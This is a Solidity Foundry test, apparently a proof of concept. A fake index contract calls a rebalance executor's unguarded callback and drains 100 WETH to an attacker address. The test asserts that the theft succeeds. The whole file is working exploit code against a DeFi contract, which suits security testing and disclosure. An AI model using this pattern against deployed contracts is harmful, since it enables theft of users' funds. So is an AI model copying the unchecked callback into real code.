// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {RebalanceExecutorV3} from "../fork/RebalanceExecutorV3.sol";
import {ISwapRouter02} from "../../src/interfaces/ISwapRouter02.sol";
contract FakeIndex {
    address[] t;
    constructor(address w) { t.push(w); }
    function componentTokens() external view returns (address[] memory) { return t; }
    function drain(RebalanceExecutorV3 e, uint256 amt) external {
        uint256[] memory o = new uint256[](1); uint256[] memory i = new uint256[](1); i[0] = amt;
        e.onXindexRebalance(o, i, "");
    }
}
contract ExecDrainTest is Test {
    function test_drain() public {
        MockERC20 weth = new MockERC20("W","W",18);
        RebalanceExecutorV3 e = new RebalanceExecutorV3(ISwapRouter02(address(0xBEEF)), address(weth));
        weth.mint(address(e), 100 ether);
        FakeIndex f = new FakeIndex(address(weth));
        vm.prank(address(0xA11CE));
        f.drain(e, 100 ether);
        emit log_named_uint("executor WETH", weth.balanceOf(address(e)));
        emit log_named_uint("attacker WETH", weth.balanceOf(address(f)));
        assertEq(weth.balanceOf(address(f)), 100 ether);
    }
}
